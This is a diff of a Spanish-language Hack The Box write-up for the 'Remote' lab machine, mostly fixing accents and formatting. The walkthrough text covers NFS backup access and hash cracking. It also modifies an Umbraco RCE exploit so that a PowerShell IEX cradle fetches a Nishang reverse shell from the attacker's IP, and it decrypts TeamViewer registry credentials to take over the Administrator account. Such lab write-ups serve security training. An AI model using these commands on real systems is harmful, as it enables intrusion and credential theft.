@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Remote - Hack The Box
-excerpt: "Esta maquina es algo dificil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la maquina, además de analizar los exploits, estos se deben configurar correctamente para su uso."
+excerpt: "Esta máquina es algo difícil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso."
 date: 2023-01-25
 classes: wide
 header:
@@ -26,11 +26,11 @@ tags:
 ---
 ![](/assets/images/htb-writeup-remote/remote_logo.png)
 
-Esta maquina es algo dificil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la maquina, además de analizar los exploits, estos se deben configurar correctamente para su uso.
+Esta máquina es algo difícil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso.
 
 # Recopilación de Información
 ## Traza ICMP
-Vamos a hacer un ping y analicemos el TTL para saber que SO utiliza la maquina:
+Vamos a hacer un ping y analicemos el TTL para saber que SO utiliza la máquina:
 ```
 ping -c 4 10.10.10.180                
 PING 10.10.10.180 (10.10.10.180) 56(84) bytes of data.
@@ -43,7 +43,7 @@ PING 10.10.10.180 (10.10.10.180) 56(84) bytes of data.
 4 packets transmitted, 4 received, 0% packet loss, time 3011ms
 rtt min/avg/max/mdev = 128.920/130.771/134.012/1.957 ms
 ```
-Con el TTL ya sabemos que es una maquina tipo Windows, realicemos los escaneos de puertos y servicios.
+Con el TTL ya sabemos que es una máquina tipo Windows, realicemos los escaneos de puertos y servicios.
 
 ## Escaneo de Puertos
 ```
@@ -100,7 +100,7 @@ Nmap done: 1 IP address (1 host up) scanned in 82.57 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Damn! Demasiados puertos abiertos y ya vemos varios servicios conocidos como el FTP, el HTTP y le SMB o Samba. Pero hay algunos que no habia visto, antes de investigarlos vamos a hacer un escaneo de servicios.
+Damn! Demasiados puertos abiertos y ya vemos varios servicios conocidos como el FTP, el HTTP y le SMB o Samba. Pero hay algunos que no había visto, antes de investigarlos vamos a hacer un escaneo de servicios.
 
 ## Escaneo de Servicios
 ```
@@ -170,7 +170,7 @@ Nmap done: 1 IP address (1 host up) scanned in 141.34 seconds
 * -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Como menciones antes, hay varios servicios que no habia visto antes como el mountd, el rpcbind y el NFS. Es momento de investigar que son estos servicios.
+Como menciones antes, hay varios servicios que no había visto antes como el **mountd**, el **rpcbind** y el **NFS**. Es momento de investigar que son estos servicios.
 
 ## Investigación de Servicios
 Primero vamos a investigar el **rpcbind** que esta en el puerto 111:
@@ -181,49 +181,49 @@ Ahora investiguemos sobre el servicio **mountd**:
 
 **El daemon mountd gestiona solicitudes de montaje de sistema de archivos desde sistemas remotos y proporciona control de acceso. El daemon mountd comprueba /etc/dfs/sharetab para determinar qué sistemas de archivos están disponibles para el montaje remoto y qué sistemas están autorizados a hacer el montaje remoto.**
 
-Y por ultimo el **servicio NFS**:
+Y por último el **servicio NFS**:
 
 **Network File System (NFS) es un estándar de servidor de archivos basado en el modelo cliente-servidor. El NFS permite a los usuarios ver, actualizar y almacenar archivos en un sistema remoto como si estuvieran trabajando localmente.**
 
-Muy bien, pues despues de leer cada concepto de los servicios, dedusco que la maquina pues es un servidor en si, esto quiere decir que aqui se almacena todo lo que tenga que ver con la pagina web que esta activa en el puerto 80 e incluso el escaneo de servicios nos dice que los 3 operan en conjunto. Además esta el puerto 5985 que el escaneo nos muestra con el servicio HTTTPAPI, vamos a investigar este ultimo:
+Muy bien, pues después de leer cada concepto de los servicios, deduzco que la máquina pues es un servidor en sí, esto quiere decir que aquí se almacena todo lo que tenga que ver con la página web que esta activa en el puerto 80 e incluso el escaneo de servicios nos dice que los 3 operan en conjunto. Además, está el puerto 5985 que el escaneo nos muestra con el servicio HTTTPAPI, vamos a investigar este último:
 
 ![](/assets/images/htb-writeup-remote/Captura7.png)
 
-Mmmm pues no es más que una API de microsoft al parecer.
+Mmmm pues no es más que una API de Microsoft al parecer.
 
-Antes de continuar e investigar la pagina web que esta operando, veamos si no hay algun exploit para los 4 servicios que ya investigamos, vamos a buscar por internet primero ya que no tenemos una version en si de todos los servicios, si lo tuvieramos seria solamente buscar un exploit con la herramienta **Searchsploit**.
+Antes de continuar e investigar la página web que está operando, veamos si no hay algún Exploit para los 4 servicios que ya investigamos, vamos a buscar por internet primero ya que no tenemos una versión en si de todos los servicios, si lo tuviéramos seria solamente buscar un Exploit con la herramienta **Searchsploit**.
 
-# Analisis de Vulnerabilidades
+# Análisis de Vulnerabilidades
 ## Buscando Vulnerabilidades para los Servicios Investigados
-Encontramos una pagina bastante interesante y que al parecer nos puede ayudar de aqui en adelante para futuras maquinas, pues te da referencias de lo que puedes hacer, lo que no puedes y de lo que necesitar para vulnerar ciertos servicios:
+Encontramos una página bastante interesante y que al parecer nos puede ayudar de aquí en adelante para futuras máquinas, pues te da referencias de lo que puedes hacer, lo que no puedes y de lo que necesitar para vulnerar ciertos servicios:
 
-Pagina HackTricks: 
+Página HackTricks: 
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
 
-Ahi incluso hay una sección que nos dice que el servicio RPCBIND puede ser vulnerable para cargar archivos si esta activo junto al servicio NFS.
+Ahí incluso hay una sección que nos dice que el **servicio RPCBIND** puede ser vulnerable para cargar archivos si está activo junto al **servicio NFS**.
 
-Esto quiza nos sirva más adelante, pero de momento vamos a investigar la pagina web.
+Esto quizá nos sirva más adelante, pero de momento vamos a investigar la página web.
 
 ## Analizando Puerto 80
-Vamos a entrar en la pagina web que esta activa y veamos que hay:
+Vamos a entrar en la página web que esta activa y veamos que hay:
 
 ![](/assets/images/htb-writeup-remote/Captura1.png)
 
-Al parecer es una tienda como de ropa pero esta incompleta. Veamos que nos dice Wappalizer:
+Al parecer es una tienda como de ropa, pero está incompleta. Veamos que nos dice **Wappalizer**:
 
 ![](/assets/images/htb-writeup-remote/Captura2.png)
 
-Utilizan algunas librerias de JavaScript pero no veo algo que nos pueda servir, sigamos analizando la pagina web.
+Utilizan algunas librerías de JavaScript pero no veo algo que nos pueda servir, sigamos analizando la página web.
 
-Hay una sección llamada "People", quiza alguno de esos nombre sea un usuario asi que seria bueno anotarlos por si las dudas.
+Hay una sección llamada **People**, quiza alguno de esos nombre sea un usuario asi que seria bueno anotarlos por si las dudas.
 
 ![](/assets/images/htb-writeup-remote/Captura3.png)
 
-En la sección "About Us" hay algunas ideas de lo que pueden implementar en la pagina y hay una subrayada como si ya se hubiera hecho, no creo que nos sirva de mucho esto pero hay que tomar en cuenta eso que subrayaron.
+En la sección **About Us** hay algunas ideas de lo que pueden implementar en la página y hay una subrayada como si ya se hubiera hecho, no creo que nos sirva de mucho esto pero hay que tomar en cuenta eso que subrayaron.
 
 ![](/assets/images/htb-writeup-remote/Captura4.png)
 
-Por ultimo en la sección de "Contact" nos viene la opción de mandar un mensaje a Umbraco. Pero que pasa si le damos click?
+Por último en la sección de **Contact** nos viene la opción de mandar un mensaje a Umbraco. ¿Pero qué pasa si le damos click?
 
 ![](/assets/images/htb-writeup-remote/Captura5.png)
 
@@ -240,7 +240,7 @@ Entonces Umbraco es un gestor de contenidos, ahuevo debe de haber credenciales p
 
 **One installed, the default username and password for the backoffice is "admin" and "test"**
 
-Probamos esto y nada, no sirve, entonces de momento vamos a dejar Umbraco hasta que tengamos una version pues con esto podemos buscar un exploit que nos sirva.
+Probamos esto y nada, no sirve, entonces de momento vamos a dejar Umbraco hasta que tengamos una versión pues con esto podemos buscar un Exploit que nos sirva.
 
 ## Analisando Servicios FTP y Samba
 Primero vamos con el FTP, ya que el escaneo de servicios nos menciona que podemos conectarnos como usuario **Anonymous** entonces veamos que hay dentro:
@@ -265,11 +265,11 @@ ftp> exit
 221 Goodbye.
 
 ```
-Nos conectamos y...nada, no nos muestra nada, quiza podamos ver si se pueden subir archivos. Probemoslo:
+Nos conectamos y...nada, no nos muestra nada, quizá podamos ver si se pueden subir archivos. Probémoslo:
 ```
 whoami > test.txt
 ```
-Creamos un archivo txt con el comando whoami para ver si se puede subir y ejecutar en el FTP, subamos el archivo:
+Creamos un archivo .txt con el comando **whoami** para ver si se puede subir y ejecutar en el FTP, subamos el archivo:
 ```
 ftp 10.10.10.180 
 Connected to 10.10.10.180.
@@ -286,37 +286,37 @@ local: test.txt remote: test.txt
 ftp> exit
 221 Goodbye.
 ```
-Nada, no tenemos permisos. Ahora veamos el servicio Samba, aunque no creo que podamos hacer mucho, ya que el escaneo no nos indico que podamos loguearnos:
+Nada, no tenemos permisos. Ahora veamos el servicio Samba, aunque no creo que podamos hacer mucho, ya que el escaneo no nos indicó que podamos loguearnos:
 ```
 smbclient -L //10.10.10.180/ -N
 session setup failed: NT_STATUS_ACCESS_DENIED
 ```
-Nope, no pudimos meternos, entonces hay que cambiar la jugada y buscar la forma de vulnerar algun servicio. Intentemos usando la pagina HackTricks, ya que no busque nada sobre NFS.
+Nope, no pudimos meternos, entonces hay que cambiar la jugada y buscar la forma de vulnerar algún servicio. Intentemos usando la página **HackTricks**, ya que no busque nada sobre NFS.
 
 ## Investigando el Servicio NFS
-Truco para HackTricks: Si usamos la palabra Pentesting y luego el servicio que buscamos, nos aparecera mejores opciones para tratar de vulnerar dicho servicio.
+Truco para **HackTricks**: Si usamos la palabra **Pentesting** y luego el servicio que buscamos, nos aparecerá mejores opciones para tratar de vulnerar dicho servicio.
 
-Buscamos por la pagina HackTricks y encontramos lo siguiente:
+Buscamos por la página **HackTricks** y encontramos lo siguiente:
 
 ![](/assets/images/htb-writeup-remote/Captura8.png)
 
-Asi que intentemos lo que nos dice, a ver que nos sale:
+Así que intentemos lo que nos dice, a ver que nos sale:
 ```
 showmount -e 10.10.10.180      
 Export list for 10.10.10.180:
 /site_backups (everyone)
 
 ```
-a...Mira nada más, cualquiera puede ver los backups...vamos a ver que hay ahi, pero antes, hay que preparar una carpeta porque según HackTricks podemos descargarlo:
+a...Mira nada más, cualquiera puede ver los backups...vamos a ver que hay ahí, pero antes, hay que preparar una carpeta porque según **HackTricks** podemos descargarlo:
 ```
 mkdir /mnt/new_back
 ```
-Se creo una carpeta llamada **new_back** en la carpeta **mnt** y si esta no existia pues tambien se crea, ahora vamos a descargar el backup que encontramos:
+Se creo una carpeta llamada **new_back** en la carpeta **mnt** y si esta no existía pues también se crea, ahora vamos a descargar el backup que encontramos:
 ```
 mount -t nfs [-o vers=2] 10.10.10.180:/site_backups /mnt/new_back -o nolock
 zsh: bad pattern: [-o
 ```
-Achis, no entiendo ese error pero vamos a tumbar ese corchete para ver si aun asi corre el comando:
+Achis, no entiendo ese error, pero vamos a tumbar ese corchete para ver si aun así corre el comando:
 ```
 mount -t nfs 10.10.10.180:/site_backups /mnt/new_back -o nolock 
 ```
@@ -334,34 +334,35 @@ Si ponemos en el navegador "Umbraco where is database" nos saldra una pagina del
 * filesystem -> No lo veo por ahi
 * /App_Data folder -> ESA SI ESTA!!!
 
-Como ya vimos, hay que investigar esa carpeta pero antes, aqui el link de Umbraco sobre donde se almacena la BD: https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data
+Como ya vimos, hay que investigar esa carpeta, pero antes, aquí el link de Umbraco sobre donde se almacena la BD: 
+* https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data
 
-Ahora si, veamos que hay en esa carpeta:
+Ahora sí, veamos que hay en esa carpeta:
 ```
 ls
 cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
 
 ```
-Mira, ahi esta el umbraco.config que tambien almacena parte de la BD de Umbraco, pero tambien esta uno con extension .sdf, pero primero vamos a ver el .config.
+Mira, ahí esta el **umbraco.config** que también almacena parte de la BD de Umbraco, pero tambien esta uno con extensión **.sdf**, pero primero vamos a ver el **.config**.
 
-Mmmmm despues de analizarlo rapidamente, no hay nada que nos pueda ayudar, salvo el nombre del creador de varios post, que se llama "admin", siento que o esta incompleto o es un nombre por default que da umbraco. Ahora veamos que es ese .sdf.
+Mmmmm después de analizarlo rápidamente, no hay nada que nos pueda ayudar, salvo el nombre del creador de varios posts, que se llama **admin**, siento que o está incompleto o es un nombre por default que da Umbraco. Ahora veamos que es ese **.sdf**.
 
-Por cierto, los .sdf son:
+Por cierto, los **.sdf** son:
 **Los archivos SDF se utilizan para almacenar bases de datos en un formato estructurado.**
 
-Entonces lo que vamos a ver sera una base de datos, no seria bueno usar cat para ver que hay dentro porque no creo que lo muestre bien pues serian datos más no strings o texto en si:
+Entonces lo que vamos a ver será una base de datos, no sería bueno usar el comando **cat** para ver que hay dentro porque no creo que lo muestre bien pues serian datos más no **strings** o texto en si:
 ```
 file Umbraco.sdf      
 Umbraco.sdf: data
 ```
-Ahi esta, son datos, entonces hay que convertirlos en strings para que se puedan leer y esto se hace de la sig. manera:
+Ahí está, son datos, entonces hay que convertirlos en **strings** para que se puedan leer y esto se hace de la sig. manera:
 ```
 strings Umbraco.sdf > /Path_Donde_Quieras_Guardar_El_Output/output
 ```
-Y ya con esto se guarda como tipo string, lo que nos permitira ver con texto toda la BD.
+Y ya con esto se guarda como tipo **string**, lo que nos permitirá ver con texto toda la BD.
 
 ## Analizando el Archivo .SDF
-Solamente hacemos un cat al output para ver que hay dentro:
+Solamente usamos el comando **cat** en el output para ver que hay dentro:
 ```
 Administratoradmindefaulten-US
 Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
@@ -381,11 +382,11 @@ domainDefaultLanguage
 ```
 Mira nada más, ya tenemos dos usuarios y tenemos un hash que supongo es una contraseña, vamos a tratar de averiguar que es ese hash.
 
-Podriamos usar la herramienta john o hashID pero vamos a usar cualquiera que nos suelte internet:
+Podríamos usar la herramienta **John** o **hashID** pero vamos a usar cualquiera que nos suelte internet:
 
 ![](/assets/images/htb-writeup-remote/Captura12.png)
 
-Aqui el link de esta pagina: 
+Aquí el link de esta página: 
 * https://hashes.com/es/decrypt/hash
 
 La contraseña es: **baconandcheese**
@@ -398,12 +399,12 @@ Y ya estamos dentro!
 
 ![](/assets/images/htb-writeup-remote/Captura10.png)
 
-Ya tenemos la version que usa Umbraco, ahora podemos buscar un exploit:
+Ya tenemos la versión que usa **Umbraco**, ahora podemos buscar un Exploit:
 
 ![](/assets/images/htb-writeup-remote/Captura11.png)
 
 # Explotando Vulnerabilidades
-Usamos searchsploit para buscar el exploit e incluso podemos buscar por internet:
+Usamos **Searchsploit** para buscar el Exploit e incluso podemos buscar por internet:
 ```
 searchsploit umbraco 7.12.4                                                                                    
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -441,7 +442,7 @@ login = "";
 password="";
 host = "";
 ```
-Como se observa, nos pide 3 datos que ya tenemos y ademas esta esa parte del codigo en donde al parecer podemos inyectar algun comando como el exploit que usamos en la maquina **Bounty Hunter**, vamos a llenar los datos que nos pide y vamos a probar con una **Traza ICMP*** para ver si funciona el exploit:
+Como se observa, nos pide 3 datos que ya tenemos y además esta esa parte del código en donde al parecer podemos inyectar algún comando como el Exploit que usamos en la máquina **Bounty Hunter**, vamos a llenar los datos que nos pide y vamos a probar con una **Traza ICMP*** para ver si funciona el Exploit:
 ```
 { string cmd = "/c ping 10.10.14.9"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
  proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
@@ -450,13 +451,13 @@ login = "admin@htb.local";
 password="baconandcheese";
 host = "http://10.10.10.180";
 ```
-Levantamos un servidor que acepte la Traza ICMP con tcpdump:
+Levantamos un servidor que acepte la **Traza ICMP** con **tcpdump**:
 ```
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
-Y activamos el exploit:
+Y activamos el Exploit:
 ```
 python Umbraco_Exploit.py
 Start
@@ -481,9 +482,10 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 8 packets received by filter
 0 packets dropped by kernel
 ```
-Esto quiere decir que si funciona dicho exploit, pero ahora que hacemos? Bueno, investigue como usar este exploit y justo aparece una pagina que explica que hacer a continuación, aqui la pagina: https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/
+Esto quiere decir que, si funciona dicho Exploit, ¿pero ahora que hacemos? Bueno, investigue como usar este Exploit y justo aparece una página que explica que hacer a continuación, aqui la página: 
+* https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/
 
-Entonces vamos a crear una Powershell Reverse Shell para conectarnos de manera remota a la maquina que usa Umbraco, entonces vamos por pasos como indica la pagina:
+Entonces vamos a crear una **Powershell Reverse Shell** para conectarnos de manera remota a la máquina que usa Umbraco, entonces vamos por pasos como indica la página:
 * Descargamos el repo **Nishang** para usar la shell que necesitamos: https://github.com/samratashok/nishang
 ```
 git clone https://github.com/samratashok/nishang.git                                        
@@ -495,7 +497,7 @@ remote: Total 1705 (delta 5), reused 4 (delta 1), pack-reused 1691
 Recibiendo objetos: 100% (1705/1705), 10.89 MiB | 10.43 MiB/s, listo.
 Resolviendo deltas: 100% (1064/1064), listo.
 ```
-* Copiamos la siguiente shell que esta en la carpeta "Shells": Invoke-PowerShellTcp.ps1
+* Copiamos la siguiente shell que esta en la carpeta "Shells": **Invoke-PowerShellTcp.ps1**
 
 ```
 cd nishang/shells
@@ -511,7 +513,7 @@ cp Invoke-PowerShellTcp.ps1 path_donde_quieras_que_se_guarde/.
 }
 Invoke-PowerShellTcp -Reverse -IPAddress TuIP -Port PuertoQueQuieras
 ```
-* Modificamos el exploit para que cargue la Reverse Shell:
+* Modificamos el Exploit para que cargue la **Reverse Shell**:
 ```
 { string cmd = "/c powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.9/Invoke-PowerShellTcp.ps1\')"; System.Diagnost>
  proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
@@ -521,12 +523,12 @@ Invoke-PowerShellTcp -Reverse -IPAddress TuIP -Port PuertoQueQuieras
 nc -nvlp 443                                        
 listening on [any] 443 ...
 ```
-* Activamos un servidor en python para que la maquina descargue el exploit:
+* Activamos un servidor en Python para que la máquina descargue el Exploit:
 ```
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
-* Activamos el exploit y vemos el resultado:
+* Activamos el Exploit y vemos el resultado:
 
 ```
 nc -nvlp 443                                        
@@ -537,21 +539,21 @@ Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 PS C:\windows\system32\inetsrv>whoami
 iis apppool\defaultapppool
 ```
-Incluso si vemos el servidor en python, veremos como se descargo y esta activo pues si lo quitamos, se quita todo:
+Incluso si vemos el servidor en Python, veremos cómo se descargó y está activo pues si lo quitamos, se quita todo:
 ```
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.180 - - [26/Mar/2023 20:15:53] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 127.0.0.1 - - [26/Mar/2023 22:05:25] "GET / HTTP/1.1" 200 -
 ```
-Bien ya estamos dentro, ahora es cosa de buscar la flag del user y listo.
+Bien ya estamos dentro, ahora es cosa de buscar la flag del usuario y listo.
 
 # Post Explotación
-Ahora que hacemos? Bien, es hora de buscar que hay en la maquina. Investigamos en varios lados pero hay algo interesante en la carpte de Program Files (x86) y es el servicio TeamViewer, pero que es esto?
+¿Ahora que hacemos? Bien, es hora de buscar que hay en la máquina. Investigamos en varios lados, pero hay algo interesante en la carpeta de **Program Files (x86)** y es el servicio **TeamViewer**, pero ¿qué es esto?
 
 **TeamViewer es un software para el acceso remoto, así como para el control y el soporte en remoto de ordenadores y otros dispositivos finales.​**
 
-Si entramos en esa carpeta, nos dira la versión que esta instalada de TeamViewer:
+Si entramos en esa carpeta, nos dirá la versión que esta instalada de **TeamViewer**:
 ```
 PS C:\Program Files (x86)> cd TeamViewer 
 PS C:\Program Files (x86)\TeamViewer> dir
@@ -564,7 +566,7 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----                                                                  
 d-----        2/27/2020  10:35 AM                Version7
 ```
-Ahora busquemos un exploit:
+Ahora busquemos un Exploit:
 ```
 searchsploit TeamViewer version7                                                                               
 Exploits: No Results
@@ -586,16 +588,16 @@ TeamViewer App 13.0.100.0 - Denial of Service (PoC)                             
 Shellcodes: No Results
 Papers: No Results
 ```
-No creo que nos sirvan estos exploits, mejor vamos a buscar por internet.
+No creo que nos sirvan estos Exploits, mejor vamos a buscar por internet.
 
-Encontre los siguientes links con datos de interes:
+Encontré los siguientes links con datos de interés:
 * https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat
 
-En este link hay varias pruebas que podemos hacer dentro de la maquina para obtener las credenciales de Windows
+En este link hay varias pruebas que podemos hacer dentro de la máquina para obtener las credenciales de Windows
 ```
 reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
 ```
-Una vez usemos este comando, nos dara información muy util que sera las credenciales pero encriptadas:
+Una vez usemos este comando, nos dará información muy útil que sera las credenciales pero encriptadas:
 ```
 LastUpdateCheck    REG_DWORD    0x6250227f
     UsageEnvironmentBackup    REG_DWORD    0x1
@@ -604,21 +606,22 @@ LastUpdateCheck    REG_DWORD    0x6250227f
     MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
     Security_PasswordStrength    REG_DWORD    0x3
 ```
-Lo que necesitamos es desencriptar dichas credenciales aunque la que más nos interesa es la de **SecurityPasswordAES**. Para desencriptarlas, vamos a usar un script en python que creo el usuario del siguiente link.
+Lo que necesitamos es desencriptar dichas credenciales, aunque la que más nos interesa es la de **SecurityPasswordAES**. Para desencriptarlas, vamos a usar un script en Python que creo el usuario del siguiente link.
 
 * https://whynotsecurity.com/blog/teamviewer/
 
-Con leer el blog, vemos la aventura que se echo para descubrir como explotar las vulnerabilidades que se encontraron en el TeamViewer Version 7 y el como le haria para desencriptar dichas credenciales, incluso el siguiente link tambien explica todo esto pero ya resumido: https://kalilinuxtutorials.com/decryptteamviewer/
+Con leer el blog, vemos la aventura que se echó para descubrir como explotar las vulnerabilidades que se encontraron en el **TeamViewer Versión 7** y el cómo le haría para desencriptar dichas credenciales, incluso el siguiente link también explica todo esto pero ya resumido: https://kalilinuxtutorials.com/decryptteamviewer/
 
-Pero nosotros vamos a ocupar esta versión: https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
+Pero nosotros vamos a ocupar esta versión: 
+* https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
 
-Para usarlo es solo copiar el codigo en un archivo .py y tener instaladas los siguientes modulos de python:
+Para usarlo es solo copiar el código en un archivo **.py** y tener instaladas los siguientes módulos de Python:
 * hexdump
 * pycryptodome
 
-PERO, antes de instalar algo, analice un poco el script y no se para que usa hexdump asi que lo quite y sirvio el script jeje.
+PERO, antes de instalar algo, analice un poco el script y no se para que usa **hexdump** así que lo quite y sirvió el script jeje.
 
-Para instalar el pycryptomode hacemos lo sig:
+Para instalar el pycryptomode hacemos lo siguiente:
 ```
 pip3 install pycryptodome    
 Collecting pycryptodome
@@ -627,7 +630,7 @@ Collecting pycryptodome
 Installing collected packages: pycryptodome
 Successfully installed pycryptodome-3.17
 ```
-Y ahora si ya podemos usar el exploit y con solo activar el script, ya solo es pasarle el encriptado de **SecurityPasswordAES**:
+Y ahora si ya podemos usar el Exploit y con solo activar el script, ya solo es pasarle el encriptado de **SecurityPasswordAES**:
 ```
 python3 TeamViewer_Exploit.py
 
@@ -640,7 +643,7 @@ Please check below mentioned registry values and enter its value manually withou
 Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
 Decrypted password is :  !R3m0te!
 ```
-Muy bien, ya tenemos la contraseña, es momento de checar si la clave funcion. Para esto, vamos a usar **Crackmapexec**:
+Muy bien, ya tenemos la contraseña, es momento de checar si la clave función. Para esto, vamos a usar **Crackmapexec**:
 ```
 crackmapexec smb 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
 SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
@@ -674,14 +677,14 @@ Mode                LastWriteTime         Length Name
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 ```
-Y ya, con esto obtenemos ambas flags y terminamos con esta maquina.
+Y ya, con esto obtenemos ambas flags y terminamos con esta máquina.
 
 # Otras Formas
-Para obtener acceso como root o NT Authority System en este caso, hay otras opciones que se pueden probar, aqui algunos:
-* Abusar del SeImpersonatePrivilege que esta activo para ejecutar una shell que nos conecta como root.
+Para obtener acceso como root o NT Authority System en este caso, hay otras opciones que se pueden probar, aquí algunos:
+* Abusar del **SeImpersonatePrivilege** que está activo para ejecutar una Shell que nos conecta como root.
 * Usando el script de Metasploit hecho en ruby para obtener las credenciales como lo hice.
-* Usar la herramienta winPEAS para editar el servicio UsoSvc y con este mismo podemos entrar como root.
-Puedes investigar y probar estas formas! Apoyate de otros WriteUps.
+* Usar la herramienta **winPEAS** para editar el servicio **UsoSvc** y con este mismo podemos entrar como root.
+¡Puedes investigar y probar estas formas! Apóyate de otros Write Ups.
 
 ## Links de Investigación
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
